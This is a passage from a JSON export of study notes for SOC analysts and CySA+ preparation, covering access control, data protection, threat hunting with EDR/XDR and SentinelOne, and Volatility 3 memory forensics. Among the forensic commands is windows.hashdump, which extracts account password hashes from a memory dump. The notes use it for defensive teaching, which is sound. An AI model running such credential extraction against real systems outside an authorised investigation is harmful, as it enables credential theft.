level of access they have to applications.\n\n\nPermissions control access to specific resources, such as data sources, system components, or network segments.\n\n\nImplementation of Access Control:\n\n\nThe system implements access control using the user roles and permissions.\n\n\nAs users attempt to access systems or data using their designated roles, permissions are regulated following the system’s established roles and permissions.\n\n\nAccess controls can be performed at different levels, such as the login process, database queries, and access to network resources.\n\n\nAdvantages of RBAC:\n\n\nEnhances the organization of business and authorization processes.\n\n\nManagement of user roles and permissions becomes easier.\n\n\nProvides security by preventing unauthorized access.\n\n\nImproves collaboration and operational efficiency.\n\n\nProvides traceability and compliance in internal and external audits.\n\n\nRole-based access control is an effective method in the design of secure network infrastructures, providing an efficient way to limit unauthorized access to data."},"SOC/Cysa+-Prep/Secure-Network-Design/Session-Management":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Session-Management","filePath":"SOC/Cysa+ Prep/Secure Network Design/Session Management.md","title":"Session Management","links":[],"tags":[],"content":"In addition to the access control we have previously discussed in the RBAC and ABAC domains, another critical risk area emerges after access has been granted which should be properly managed and controlled. Users’ access should be granted for the required time period and the session should be terminated automatically. This measure safeguards against unauthorized access and mitigates the risk of session hijacking. For proper session management, you need to consider the following processes individually and implement control mechanisms for each process.\n1. Starting a Session: The session should start according to the conditions specified in the RBAC and/or ABAC articles.\n2. Maintaining a Session: The session should persist under the same conditions in which it was initiated.\n3. Session Monitoring: During the session period, there should be no activity other than the scheduled permissions and privileges.\n4. Session Termination: The session must be terminated properly.\nAuthorization and session managements are key elements of access control and are critical for a secure network infrastructure. These processes manage the authorization process by assigning the correct permissions to users and ensuring that sessions are managed securely."},"SOC/Cysa+-Prep/Secure-Network-Design/Static-and-Dynamic-Data":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Static-and-Dynamic-Data","filePath":"SOC/Cysa+ Prep/Secure Network Design/Static and Dynamic Data.md","title":"Static and Dynamic Data","links":["SOC/SOC-Analyst-Notes/Firewall","SOC/Cysa+-Prep/Network-Design-and-Security-Products/Segmentation","SOC/SOC-Analyst-Notes/SIEM"],"tags":[],"content":"As you can anticipate, the realm of data encryption is quite extensive. In this module, we will discuss the basic concepts and methods related to the topic.\nWhen constructing a secure network, categorizing data into two distinct headings, static and dynamic, significantly simplifies our task when dealing with data encryption.\nSo what are the terms static and dynamic data?\nStatic (stationary) data: Static data, as its name suggests, remains stationary; it is stored somewhere, awaiting utilization. Examples include data on disks, etc. All forms of data residing in these kinds of environments fall within this category.\nDynamic data: Dynamic data, as the name implies, is data that moves from one place to another. \nThis can also be a file downloaded to your system from an internet source (considered dynamic data as long as the download process continue), as well as data acquired from your file server and saved onto your system.\nWe should know that we need to take distinct security measures depending on the type and situation of the data. Let’s explore this with an example: \nLet’s assume you have two different locations, let’s call them A and B. Suppose you have a file server at location A, and we intend to download the file “invoices.pdf” from here to a user’s system at location B.\n\nLet’s consider that we have ensured all the required permissions in our Firewall, the Role-Based Access Control on our File Server is functioning correctly, the user’s password adheres to strong password policies, and two-factor authentication is implemented.\nThe endpoint at Location B has effectively cleared all these criteria, including the invoice files. Let’s visualize that you’ve initiated the download of the PDF file. As the file download started, we observed a segment of its path across the internet. With this our user has demonstrated to our system the capability to acquire this file, which is now accessible and readable.\nAlthough there are precautions we can take when connecting our two locations, this is beyond our control. It is clear that we have no control over the systems that our data passes through when leaving Location A and going to Location B. \nAt this point, the only action we can take is to transform the data into something that only we can interpret before it leaves its source and to restore it to its original state when it arrives at the destination. \nIn this illustration, the data residing on the file server was considered static, but it transformed into dynamic mode as soon as the user initiated the download. We are talking about different types of data and in both scenarios which requires distinct measures for each set of dynamics.\nRegarding our static data, we’ve already discussed segmentation, RBAC, and so on. While these measures are effective, we must adopt additional measures for dynamic data.\nProtection of Dynamic Data\nSafeguarding this type of data revolves around ensuring data security during the processes of transfer and sharing. Within these processes, safeguarding data for confidentiality, integrity, and accessibility are the most important aspects and can be  approached through five following categories:\nData Encryption (Data Encryption):\n\n\nData encryption is one of the most widely used methods for protecting dynamic data.\n\n\nThe data is encrypted and transferred securely during the transmission process.\n\n\nEncryption ensures that data is rendered unintelligible to protect it from unauthorized access.\n\n\n\n(Image Source: www.egnyte.com/guides/governance/data-encryption)\nSecure Data Communication:\n\n\nSecure communication channels should be used for the secure transmission of data on the move.\n\n\nSecure communication channels enable encrypted data transfer and verification.\n\n\nEncryption and authentication mechanisms such as SSL/TLS protocols can be used.\n\n\n\n(Image Source: techaxiskenya.co.ke/product/moving-your-website-to-https-ssl/)\nData Integration:\n\n\nDynamic data can be integrated between different systems and applications. \n\n\nDuring the data integration process, we sure make sure that the data is transferred and verified securely.\n\n\nIntegration points should be protected from unauthorized access and secure authentication and authorization mechanisms should be utilized.\n\n\nLimitations of Data Storage:\n\n\nDynamic data protection also includes not storing data unnecessarily.\n\n\nData should be stored as long as necessary and should be purged regularly to reduce the risk of unnecessary retention.\n\n\nIn addition, the data must be stored securely for the duration of the retention period and access to the data must be restricted.\n\n\nData Control and Monitoring:\n\nData control and monitoring mechanisms should be utilized to protect dynamic data.\nData flow and sharing should be monitored, and unauthorized access attempts or data breaches should be detected.\nMonitoring allows rapid detection and response to security incidents.\n\nProtecting dynamic data ensures that the data is secure during transmission and prevents unauthorized access, data breaches, or data loss. Measures such as encryption, secure communication, data integration, data storage restrictions, and data control play an effective role in protecting data.\nProtection of Static Data\nSafely storing static data is a crucial step to ensure the security of an organization or system. Followings are some of the methods to ensure the static data security:\nData Encryption:\nEncrypting static data when stored guarantees to safeguard it against unauthorized access. Through cryptographic algorithms, the data undergoes encryption, rendering it comprehensible solely to authorized users. Encryption can be implemented within the data storage medium (such as disks or databases) or during data transmission.\nAccess Controls:\nAppropriate access mechanisms must be used to regulate data access. Users should be granted only the access they need, and authorization controls should be enforced. Defining user roles, permissions, and data restrictions ensures that only legitimate users have access to data.\nData Backup and Recovery:\nSecure backup and recovery processes should be established for static data. Regular backup of data and secure storage of backups ensure that data is recovered in case of data loss so it is critical to pay attention to the security of backup data as well.\nData Storage Security:\nStorage areas for static data should be secured with a combination of physical and electronic security measures. Physical security includes measurements like secure data centers or server rooms, access controls, security cameras, and alarm systems. On the other hand, electronic measurements include strong encryption, firewalls, security tools, and intrusion detection systems.\nSecurity Monitoring and Incident Response:\nMonitoring the security status of static data and detecting anomalous activities has critical importance to detect and protect against incident cases. Tools like daily logs and security information and incident management systems (SIEM) are utilized to monitor security incidents which make rapid and efficient intervention when abnormal or unusual activities or security breaches are detected.\nData Deletion and Destruction:\nWe should be really careful when we need to delete and destroy the static data securely."},"SOC/Cysa+-Prep/Secure-Network-Design/Strong-Authentication-Methods":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/Strong-Authentication-Methods","filePath":"SOC/Cysa+ Prep/Secure Network Design/Strong Authentication Methods.md","title":"Strong Authentication Methods","links":[],"tags":[],"content":"Strong authentication methods provides additional layers of security beyond the password to verify a user’s identity. These include two-factor authentication, biometrics, and security keys.\nStrong authentication methods are access control methods that provide a higher level of security to verify the identity of users. These methods typically involve more steps or components than single-factor authentication methods. Let’s take a look at those components:\nMulti-Factor Authentication (MFA):\n\n\nMulti-factor authentication stands as the most commonly used strong authentication method.\n\n\nIt is a process in which more than one factor is used to verify the user’s identity.\n\n\nUsually, three factors are used: the information factor (password), the possession factor (phone or other physical devices), and the inherence factor (biometric data or physical characteristics).\n\n\n\n(Image Source: www.monash.edu/esolutions/accounts-passwords/multi-factor-authentication)\nTechnological Authentication Methods:\n\n\nBiometric Verification: Identity verification is provided by using biometric data such as fingerprint, face recognition, and retina scan.\n\n\nPhysical Devices: Authentication is performed using devices such as SMS verification codes, mobile verification applications, or physical ID cards.\n\n\nTechnological Authentication Methods provide stronger and more complex verification, reducing the risk of identity theft and unauthorized access.\n\n\n\n(Image Source: gkaccess.com/support/information-technology-wiki/biometric-authentication/)\nPassword Policies and Long, Complex Passwords:\n\n\nPassword policies are implemented as part of strong authentication.\n\n\nThe use of long, complex, and unique passwords is encouraged.\n\n\nPasswords should be changed periodically, stored securely, and should not be reused.\n\n\n\nSecondary Confirmation Methods:\n\n\nSecondary confirmation methods such as email verification, phone verification, or verification through social media accounts can be used.\n\n\nAn additional verification step is required to verify the user’s identity. \n\n\nStrong authentication methods reduce the risk of identity theft, unauthorized access, and data breaches by following the steps mentioned below:\n\n\nEnabling Multi-Factor Authentication for users.\n\n\nDetermining password policies and encouraging the use of complex, long passwords.\n\n\nApplication of technological authentication methods such as biometric verification or physical devices.\n\n\nThe use of secondary confirmation methods and the activation of additional verification steps.\n\n\nEnhancing user education and awareness by emphasizing the significance and utilization of strong authentication methods.\n\n\nStrong authentication methods provide a more secure environment for access control and increase the security of data and systems by reducing unauthorized access."},"SOC/Cysa+-Prep/Secure-Network-Design/index":{"slug":"SOC/Cysa+-Prep/Secure-Network-Design/index","filePath":"SOC/Cysa+ Prep/Secure Network Design/index.md","title":"index","links":["SOC/Cysa+-Prep/Secure-Network-Design/Overview-of-Security-Principles","SOC/Cysa+-Prep/Secure-Network-Design/Security-Principle--Access-Control","SOC/Cysa+-Prep/Secure-Network-Design/Functional-Separation-and-the-Principles-of-the-Least-Privilege","SOC/Cysa+-Prep/Secure-Network-Design/Strong-Authentication-Methods","SOC/Cysa+-Prep/Secure-Network-Design/Session-Management","SOC/Cysa+-Prep/Secure-Network-Design/Static-and-Dynamic-Data","SOC/Cysa+-Prep/Secure-Network-Design/Identification-and-Remediation-of-Weak-Links"],"tags":[],"content":"1. Overview of Security Principles\n2. Security Principle- Access Control\n3. Functional Separation and the Principles of the Least Privilege\n4. Strong Authentication Methods\n5. Session Management\n6. Static and Dynamic Data\n7. Identification and Remediation of Weak Links"},"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Incident-Response-with-EDR-XDR":{"slug":"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Incident-Response-with-EDR-XDR","filePath":"SOC/Cysa+ Prep/Threat Hunting and IR with XDR,EDR/Incident Response with EDR-XDR.md","title":"Incident Response with EDR-XDR","links":[],"tags":[],"content":"Incident management is a process that helps for detecting, investigating, responding and remediating a cyber attack or other security incidents. Incident management is key to maintaining the organization’s cybersecurity posture and minimizing the impact of an attack.\nThe incident management process includes the following stages:\nIncident detection\nThe incident response team uses a variety of tools and techniques to detect potential threats. These tools include firewalls, network detectors, endpoint security solutions, and EDR/XDR technologies.\nIncident investigation\nThe incident response team uses a variety of tools and techniques to investigate detected incidents. These tools include incident management tools, security analysis tools, and threat intelligence sources.\nIncident response\nThe incident response team uses a variety of tools and techniques to respond to incidents that are detected and investigated. These tools include endpoint security solutions, firewalls, and network detectors.\nIncident remediation\nThe incident response team uses a variety of tools and techniques to determine the causes of detected and responded to incidents and prevent future attacks. These tools include incident management tools, security analysis tools, and threat intelligence sources.\nEDR/XDR technologies can help make incident management more effective. EDR/XDR technologies are used to detect and analyze potential threats using data collected from endpoints, networks, and other sources. This data can help incident managers detect and respond to incidents faster and more accurately.\n\n(Image Source: www.blumira.com/incident-response-guide-malware-infections/ )\nHow to Relate EDR/XDR to Incident Response?\nEarly Threat Detection\nEDR and XDR technologies continuously monitor organizations’ networks, endpoints and cloud infrastructures. In this way, abnormal or unusual behavior, malware or signs of threats can be detected quickly. This early detection allows attacks to be addressed in their early stages and helps limit potential damage.\nRapid Response Capacity\nEDR/XDR technologies are equipped with automation and fast response mechanisms. In this way, when a threat is detected, automatic response mechanisms can involve to take action. For example, when a malicious file is detected, responses such as quarantining this file or isolating the system from the network access can be carried out automatically. This rapid response helps prevent the spread of attacks and minimize their impact.\nDetailed Analysis and Diagnosis\nEDR and XDR technologies have the capacity to analyze attacks in detail. These analyses may include details such as how the attack occurred, what steps were followed, and which systems were affected. These analyses are critical to better understand the causes and consequences of the event.\nIdentifying the Chain of Events\nEDR/XDR technologies can detect how attacks occur step by step. This is important to determine the attack chain and understand what stages the attack went through. This information helps develop strategies to predict and prevent similar attacks in the future.\nProvide Visibility\nWhile EDR technologies monitors activities at endpoints, XDR can also monitor network and cloud-based activities. This holistic visibility is critical for detecting and blocking threats across platforms. Thanks to the integration of data from different sources, the entire threat can be better understood.\nAutomation and Efficiency\nEDR/XDR technologies reduce human error and speed up the response process thanks to their automation capabilities. Tasks that people must implement manually are automated, so response times are faster and teams can work more efficiently.\nData Collection and Storage\nEDR/XDR solutions can store data collected during the attack for analysis and use when necessary. This data is important for analyzing the attack, determining the source of the threat and preventing attacks. It can also be used to extract lessons learned to improve future incident response processes.\nLearning and Improvement\nThe use of EDR/XDR technologies provides an opportunity to learn from experiences gained from real attacks and incidents. These experiences help improve future incident response processes. Improvement opportunities are identified and security defenses are strengthened.\nIntegration of Various Data Sources\nXDR provides more comprehensive visibility by integrating different data sources. This makes it easier to evaluate and detect attacks from different perspectives.\nData Based Decision Making\nEDR/XDR tools deliver data-driven analysis and reports, enabling teams to make better decisions. Thanks to decision-making based on this data, more effective strategies are developed.\nIn conclusion, EDR and XDR technologies strengthen the organization’s security defenses, helping them responding to cyber attacks faster, detect threats more effectively, and be ready for future attacks. These technologies make the Incident Response process more effective and efficient."},"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Purpose-and-Methods-of-Threat-Hunting":{"slug":"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Purpose-and-Methods-of-Threat-Hunting","filePath":"SOC/Cysa+ Prep/Threat Hunting and IR with XDR,EDR/Purpose and Methods of Threat Hunting.md","title":"Purpose and Methods of Threat Hunting","links":[],"tags":[],"content":"Threat hunting is a proactive cybersecurity approach and was developed not as a reaction to a specific security incident, but to detect and respond to such incidents in advance. Threat hunting actively investigates computing networks and systems to detect, analyze, and take action against potentially dangerous and suspicious activities.\nPurposes of Threat Hunting\nProactive Defense\nTraditional security approaches are generally reactive, meaning they take action after a security breach occurs. The primary goal of threat hunting is to adopt a proactive defensive posture in which threats are detected and blocked. By actively searching for potential threats in systems and networks, it ensures that these threats are detected and blocked before they turn into real harm.\nReducing Attacker’s Residence Time\nAttackers usually have a residence time after taking over a network or system. During this time, they may engage in data theft, spreading malware, or other malicious activities. By reducing this dwell time, threat hunting limits attackers’ activities and minimizes potential damage.\nProtection Against Advanced Threats\nToday’s threats are becoming increasingly sophisticated to bypass traditional security tools and solutions. Threat hunting actively scans computing networks and systems to detect specialized and targeted threats such as Advanced Persistent Threats (APTs).\nSecurity Posture Improvement\nThreat hunting helps security teams identify vulnerabilities and potential risks in their networks. This information can be used to create a more robust security architecture and strengthen existing security protocols.\nIn summary, threat hunting helps organizations take a proactive security approach. This approach ensures that attackers are detected early and dealt with effectively, preventing potential harm and minimizing security risks.\n\n(Image Source: www.crowe.com/cybersecurity-watch/hunting-the-hunters )\nMethods of Threat Hunting\nHypothesis-Based Hunting\nThis approach is a method in which security experts develop a hypothesis on a particular threat or suspicion of malicious activity. For example, if an expert suspects that a particular type of malware may have infiltrated the company network, he or she initiates an in-depth investigation into that hypothesis.\nMachine Learning and Analytics Hunting\nIn this approach, a baseline is created on the normal network traffic and user behavior. Anomaly hunting detects deviations or anomalies from this norm. These deviations may be indicative of a threat or malicious activity.\nSignature-Based Hunting\nThis approach uses signatures of pre-defined malicious activities or malware samples. Malicious activities have certain “signatures” and this method aims to find potential threats by detecting these signatures.\nTTP Based Hunting (Tactics, Techniques, and Procedures)\nIt is carried out based on the tactics, techniques and procedures used by attackers. CTI (Cyber Threat Intelligence) reports and other intelligence sources help hunters understand what types of TTPs attackers are using.\nAutomation and Triage\nMaking an initial assessment of suspicious events using tools configured for automatic threat detection.\nEach of these methods focuses on a different aspect of threat hunting. For example, hypothesis-based hunting is often used in situations where a hunter has a specific idea or intuition about a specific threat vector or tactic, while analytical hunting is often used to analyze large amounts of data and detect specific behavioral patterns or anomalies."},"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Threat-Hunting-Techniques-with-EDR-XDR":{"slug":"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Threat-Hunting-Techniques-with-EDR-XDR","filePath":"SOC/Cysa+ Prep/Threat Hunting and IR with XDR,EDR/Threat Hunting Techniques with EDR-XDR.md","title":"Threat Hunting Techniques with EDR-XDR","links":[],"tags":[],"content":"Even though EDR/XDR tools are the most important resources for threat hunting process and they may not be enough to achieve the goal because it requires many other resources. Other tools and technologies required for threat hunting are SIEM, XDR/EDR, CTI, network-based threat detection technologies (NIDS, NDR, etc.) and Sandboxes.\nThreat Hunting Techniques with EDR/XDR\nEDR and XDR technologies are invaluable tools to support threat hunting activities. Thanks to these technologies, security professionals can proactively investigate and respond to potential threats. The main hunting techniques are as follows:\nIndicator-based Hunting\nIndicator-based Hunting is a threat hunting method that detects potential threats using previously known markers or indicators of malicious activity. These indicators are generally obtained from previously detected events, public sources, private intelligence sources or sector-specific shares.\nFor example; A security report states that a malicious botnet was controlled from a specific IP address. This will help cybersecurity analysts to search for this IP address in their organization’s network traffic to check whether there is any interaction with those IPs and to be on the alert.\nBehavioral-based Hunting\nBehavioral-based Hunting is a proactive threat hunting approach that detects potential threats by monitoring typical behavior of systems, users, or networks, rather than relying on static indicators of known malicious activity. This method is based on predefined behavioral characteristics and analytics.\nFor example; Such as a user without administrative rights unexpectedly running administrative tools on the system, or a standard user running “PowerShell” or “Command Prompt” with administrative rights.\nHeuristic Hunting\nHeuristic Hunting is a threat hunting method that uses general behavioral characteristics and rules to detect potential threats without relying on specific threat signatures or known behaviors. This approach is often used to detect new and unknown threats.\nFor example; You see a constant and rapid port scanning activity on your network which is like a device on your internal network  scanning thousands of ports in a few seconds.\nThreat Hunting with SentinelOne\nSentinelOne offers numerous features for threat hunting. One of the major characteristics of SentinelOne is that the wide range of telemetry data it collects. Using SentinelOne’s “Deep Visibility” feature, you can query all activity associated with a specific IP address, domain, URL or hash value.\nTo perform threat hunting with SentinelOne, the “Hunting” menu opens on the “Visibility” screen.\n\n\nBy opening more than one new tab on this screen, you can run different hunting queries in different tabs.\n\n\nBy default, threat hunting data is kept for 14 days in SentinelOne.\n\n\nYou can access ready-made queries (basic, advanced, etc.) on this screen.\n\n\n\nYou can type your query in its search bar labeled as “Start Hunting” which has the autocomplete feature. You can specify a field name or value etc. Similar field names and values to yours will automatically be listed at the bottom as you type. For example, if we are going to search for an event type, we can press the “TAB” key to list the event types we can search down.\n\n\nAdditionally, SentinelOne displays all the data collected on the hunting screen in different tabs according to certain categories. The main ones are Processes, Cross Process, Indicators, Files, Network Actions, DNS, URL, Registry, Scheduled Tasks, Logins, Driver Load, Command Scripts.\n\nThe “Indicators” tab in the “Hunting” section of SentinelOne can be thought of as a tool that allows you to investigate specific threat indicators and identify potential threats on your systems based on these indicators. This tab is used to search and analyze signs of malicious activity. This is a proactive security approach which scans your network based on known signs of malware and helps you identify potential threats.\nFor example, when we look at the Indicator detail below, it is reported that the “cmd.exe” opened by the “admin” user was run via a shortcut, not as a direct incident, but as a potential suspicious activity. This situation points to the Mitre T1204 technique.\n\nWhen we look at another Indicator detail, we see that the case reported as “Different Original Filename” was actually run by the “C:\\python27\\excel.exe” application, which imitates excel.exe, one of the Microsoft Office applications, but this exe was reported because it is not the original Excel application.\n\nConclusion/Summary\nThreat hunting is an approach used by cybersecurity professionals to proactively investigate and respond to potential threats. EDR/XDR technologies are invaluable tools to support threat hunting activities. These technologies are used to detect and analyze potential threats using data collected from endpoints, networks, and other sources."},"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/What-is-Threat-Hunting":{"slug":"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/What-is-Threat-Hunting","filePath":"SOC/Cysa+ Prep/Threat Hunting and IR with XDR,EDR/What is Threat Hunting.md","title":"What is Threat Hunting","links":[],"tags":[],"content":"What is Threat Hunting?\nThreat hunting is a security approach that is carried out proactively, not in response to security incidents, but to identify, isolate and prevent these incidents ahead of time. The goal is to actively investigate these threats, assuming they may have infiltrated the organization’s network. This is done by analyzing many data sources such as network traffic, log files and endpoint data. The concept of threat hunting has the following features.\nProactive Approach\nCyber threat hunting actively searches for potential threats rather than waiting to identify them.\nIn-Depth Data Analysis\nHunters deeply examine data from log files, network traffic, and other data sources.\nUse of Specialized Tools and Techniques\nThreat hunters often use specialized tools and techniques beyond standard security tools to better detect threats.\nHuman-Focused\nWhile automated security tools can assist in this process, cyber threat hunting relies heavily on the analytical capabilities of experienced security professionals.\nWhy is Cyber Threat Hunting Necessary?\nCyber threats are constantly evolving and attackers keep developing new infiltration techniques. While traditional security tools work based on known threat signatures, cyber threat hunting uses analytical and heuristic approaches to detect attacks that have not yet been “signatured” or are customized. This better protects organizations against advanced persistent threats (APTs) and unknown threats such as zero-day attacks.\nTraditional security solutions are effective at detecting known threats, but in the ever-changing and evolving cyber threat landscape, this is only the first step. Here are some key reasons why cyber threat hunting is so essential:\nEvolving Threat Landscape\nCyber attackers are constantly finding new ways to bypass traditional security solutions. This is mainly achieved through zero-day infiltration methods, advanced persistent threats (APTs) and specialized malware.\nProactive Approach\nTraditional security tools have a reactive approach; They react when a threat is detected. However, threat hunting aims to actively find threats before they have an impact.\nComprehensive Visibility\nThreat hunting often includes techniques such as in-depth network analysis, endpoint monitoring and log analysis. This helps organizations monitor every corner of their IT infrastructure.\nClosing Gaps\nThe ability to find threats that traditional security tools cannot detect. It helps closing security gaps.\nHuman Factor\nCyber threat hunting relies on the analytical and problem-solving abilities of experienced security professionals that go beyond automated tools and alerts. The human factor is critical for detecting certain patterns of behavior that computers may miss.\nReduction of the Damage\nAn active hunting approach can significantly reduce how long attackers operate on a network (dwell time). This means reducing potential damage and cost as well.\nRisk Management\nActive threat hunting helps organizations better understand and manage their risks. This provides more effective protection of their most valuable assets against threats.\nUltimately, cyber threat hunting is a critical process that complements traditional security approaches and protects organizations against unknown and ever-changing threat landscape. This is especially important today, when the cyber threat landscape is constantly evolving and attackers are using more sophisticated and targeted attack methods."},"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/index":{"slug":"SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/index","filePath":"SOC/Cysa+ Prep/Threat Hunting and IR with XDR,EDR/index.md","title":"index","links":["SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/What-is-Threat-Hunting","SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Purpose-and-Methods-of-Threat-Hunting","SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Threat-Hunting-Techniques-with-EDR-XDR","SOC/Cysa+-Prep/Threat-Hunting-and-IR-with-XDR,EDR/Incident-Response-with-EDR-XDR"],"tags":[],"content":"1. What is Threat Hunting\n2. Purpose and Methods of Threat Hunting\n3. Threat Hunting Techniques with EDR-XDR\n4. Incident Response with EDR-XDR"},"SOC/Cysa+-Prep/Windows-Memory-Forensics/Analyzing-the-Memory-Dump":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/Analyzing-the-Memory-Dump","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/Analyzing the Memory Dump.md","title":"Analyzing the Memory Dump","links":[],"tags":[],"content":"Memory dump analysis plays a critical role in both forensic investigations and system troubleshooting. A memory dump obtained from a system provides comprehensive information about currently running processes, active user sessions, network connections, and possible malware. This lesson provides a step-by-step guide to analyzing a memory dump in detail.\nBelow are the tools that can be used for memory forensics on Windows systems and their brief descriptions:\nVolatility : Volatility is an open-source memory analysis framework that supports a wide range of operating systems and memory dump formats. It provides a wide range of features for user activity and malware analysis.\nRekall : Another open-source tool designed to capture and analyze memory dumps. Similar to Volatility, Rekall has broad operating system support and allows for detailed analysis.\nBelkasoft Evidence Center : Belkasoft Evidence Center, a comprehensive digital forensics investigation platform, can collect and analyze data from various digital data sources as well as memory dumps. It can analyze user activity, Internet history, and social media.\nBefore memory dump analysis can be performed, the appropriate tools must be installed and configured. Volatility, one of the most popular memory analysis tools, is preferred because it is compatible with a wide range of operating systems and memory dump formats.\nVolatility 3\nVolatility manages the storage analysis process in 3 key dimensions:\n\n\nMemory Layers\n\n\nTemplates and Objects\n\n\nSymbol Tables\n\n\nMemory Layers\nMemory Layers is one of the main building blocks that Volatility 3 uses to perform memory analysis. Memory layers represent different memory resources such as physical memory, virtual memory, and the file system. These layers provide abstraction between different parts of the analyzed memory image, allowing the tool to access the memory image at different levels. For example, a physical memory layer provides direct access to the raw memory image, while a virtual address translation layer emulates the virtual memory layout of the operating system. This allows Volatility to be more flexible in dealing with different types of memory structures and operating systems.\nTemplates and Objects\nVolatility 3 uses both Templates and Objects to represent in-memory structures. Templates contain definitions of in-memory data structures, while Objects are concrete instances created according to the templates. For example, an operating system’s process list can be defined using a template, and each process can be created as a corresponding object. This structure allows Volatility to recognize complex data structures in memory and present them to the user. Access to data in the memory image is consistent and understandable through objects and templates.\nSymbol Tables\nSymbol tables contain the addresses and layouts of data structures and functions used by operating system kernels and other system components, and allow Volatility to recognize and interpret specific structures within the memory image. For example, a Windows symbol table may contain the locations of system calls, operating system objects, and other important kernel structures. Volatility 3 uses these symbol tables to determine which data structures to use when analyzing the memory image and how to interpret them.\nVolatility 3 stores all this in a context that acts as a container for all the different layers and tables required for analyzing memory.\nThe wide range of plug-ins and commands provided by Volatility meet various memory analysis needs and allow users to perform in-depth system analysis. To perform effective dump analysis, however, users must have a good understanding of the operating system and the structure of the system from which the dump is taken.\nSome of the basic Volatility3 commands and their use in Windows memory dump analysis are shown below:\nTo view the operating system, version, and other basic information from the memory dump file:\n                `python vol.py -f &lt;memory_dump&gt; windows.info`\n              \n\nTo get user account hashes from the SAM database:\n                `python vol.py -f &lt;memory_dump&gt; windows.hashdump`\n              \n\nTo display a list of processes running on the system:\n                `python vol.py -f &lt;memory_dump&gt; windows.pslist`\n              \n\nTo list DLLs loaded by running processes:\n                `python vol.py -f &lt;memory_dump&gt; windows.dlllist`\n              \n\nNote : It’s important to see what libraries processes are using.\nTo look for memory segments containing potentially malicious code:\n                `python vol.py -f &lt;memory_dump&gt; windows.malfind`\n              \n\nDisplays the tree structure of processes and shows parent/child relationships:\n                `python vol.py -f &lt;memory_dump&gt; windows.pstree`\n              \n\nTo scan and list the drivers on the system:\n                `python vol.py -f &lt;memory_dump&gt; windows.driverscan`\n              \n\nTo list the driver modules installed on the system\n                `python vol.py -f &lt;memory_dump&gt; windows.drivermodule`\n              \n\nIt scans all processes in memory, unlike pslist, it also lists processes that have terminated but still have traces in memory:\n                `python vol.py -f &lt;memory_dump&gt; windows.psscan`\n              \n\nLists the command line arguments of running processes. This can be used to understand how processes are started.\n                `python vol.py -f &lt;memory_dump&gt; windows.cmdline`\n              \n\nTo list registry hives:\n                `python vol.py -f &lt;memory_dump&gt; windows.registry.hivelist`\n              \n\nTo perform a scan of the registry hives:\n                `python vol.py -f &lt;memory_dump&gt; windows.registry.hivescan`\n              \n\nTo list installed Windows kernel modules:\n                `python vol.py -f &lt;memory_dump&gt; windows.modules`\n              \n\nTo list all network connections for all processes:\n                `python vol.py -f &lt;memory_dump&gt; windows.netscan`\n              \n\nAllows you to scan Windows memory dumps using YARA rules:\n                `python vol.py -f &lt;memory_dump&gt; yarascan.YaraScan --yara-rules &quot;/path/to/yara_rules.yar&quot;`\n              \n\nTo learn more about Volatility 3, you can visit: volatility3.readthedocs.io/en/latest/basics.html\nMemory Dump Analysis with Volatility 3\nAs an example of memory dump analysis with Volatility, we will analyze the memory dump “LD-DC01-memdump.mem” from the previous lesson.\nFirst, we must use Volatility to retrieve the operating system and version information from the memory dump file.\nThe following command retrieves summary information from the memory dump file:\n                `python.exe .\\vol.py -f LD-DC01-memdump.mem windows.info`\n              \n\nBased on this information, determine the appropriate volatility symbol and continue the analysis.\n\nBelow is an example of Windows memory forensics analysis output:\nList of Processes\nYou can view a list of running processes from the memory dump:\n                `python.exe .\\vol.py -f LD-DC01-memdump.mem windows.pslist`\n              \n\n\nRunning Process Arguments \nYou can list running processes’ command line arguments in the dump:\n                `python.exe .\\vol.py -f LD-DC01-memdump.mem windows.cmdline`\n              \n\n\nDLL List\nYou can also list DLLs loaded by running processes:\n                `python.exe .\\vol.py -f LD-DC01-memdump.mem windows.dlllist`\n              \n\n"},"SOC/Cysa+-Prep/Windows-Memory-Forensics/Basic-Memory-Analysis":{"slug":"SOC/Cysa+-Prep/Windows-Memory-Forensics/Basic-Memory-Analysis","filePath":"SOC/Cysa+ Prep/Windows Memory Forensics/Basic Memory Analysis.md","title":"Basic Memory Analysis","links":[],"tags":[],"content":"Memory Forensics Fundamentals is an essential aspect of digital forensics, providing critical information for understanding potential security breaches or system failures. Analyzing memory dump is a fundamental part of the digital forensics process and is performed with advanced tools such as Volatility.\nBefore proceeding with the memory dump analysis process, you can access the list of Volatility 3’s plug-ins available for Windows memory forensics by running the following command:\n                `python vol.py --help | findstr windows.`\n              \n\n\nCheck the help output of a plugin for detailed information about that plugin:\n                `python vol.py windows.pslist.PsList -h`\n              \n\n\nProcess of Memory Dump Analysis\nA basic “Windows Memory Dump Analysis” should include below steps:\n\n\nImage Identification\n\n\nProcesses and Threads\n\n\nNetwork Connections\n\n\nRegistry Analysis\n\n\nFile Analysis\n\n\nMalware Analysis\n\n\nService Analysis\n\n\nImage Identification\nThe first step is to verify the type and format of the memory dump file to be analyzed. This step is critical to the accuracy of the analysis because the selection of the appropriate profile affects the reliability of the analysis results directly. Factors such as operating system version, architecture, and kernel version must be correctly identified.\nTo verify the integrity of your memory dump file, you can use “md5sum” or alternative hashing algorithms to quickly obtain the hash value of the file.\n                `CertUtil -hashfile .\\mimi.mem MD5`\n              \n\n\nProcesses and Threads\nAt this step, a comprehensive list of processes and threads running on the system is obtained. This list will help to identify suspicious or malicious processes and distinguish between normal and abnormal activity on the system. In addition, the process tree and parent-child 